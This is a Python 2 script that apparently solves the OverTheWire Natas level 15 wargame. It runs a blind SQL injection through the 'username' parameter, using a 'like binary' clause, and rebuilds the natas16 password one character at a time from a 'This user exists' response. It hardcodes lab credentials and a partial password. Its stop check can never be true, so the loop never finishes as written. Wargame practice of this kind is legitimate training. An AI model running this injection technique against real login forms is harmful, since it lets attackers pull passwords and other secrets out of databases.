import string
import requests

URL = 'http://natas15.natas.labs.overthewire.org/?username=natas16" and password like binary "%s%%&debug'
ALPHANUM = string.letters + string.digits
USER_EXISTS = "This user exists"
CREDS = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

s = requests.Session()
s.auth = CREDS

password = "W" # got 'W' by running edited version in interpreter
#password = 'WaIHEacj63wnNIBROHeqi3p9'
new_letter = ALPHANUM[0]

while True:
	for index, new_letter in enumerate(ALPHANUM):
		url = URL % (password + new_letter)
		data = s.get(url).text
		if USER_EXISTS in data:
			password += new_letter
			print password
			break
	if index == len(ALPHANUM):
		print "Finished"
		break
